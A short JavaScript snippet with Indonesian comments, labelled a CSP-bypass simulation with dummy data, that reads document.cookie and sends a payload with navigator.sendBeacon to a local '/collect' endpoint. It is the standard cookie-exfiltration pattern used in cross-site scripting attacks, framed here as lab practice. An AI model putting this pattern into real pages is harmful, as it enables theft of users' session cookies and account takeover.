
// SIMULASI CSP BYPASS - DATA DUMMY

const cookie = document.cookie

// Kirim data dummy ke server Python lokal
const payload = JSON.stringify(dummyData);

const terkirim = navigator.sendBeacon(
    "http://127.0.0.1:5000/collect",
    new Blob([payload], { type: "text/plain" })
);

if (terkirim) {
    alert("Simulasi selesai!\nData dummy telah dimasukkan ke antrean pengiriman.");
} else {
    alert("Pengiriman gagal dimulai.");
}
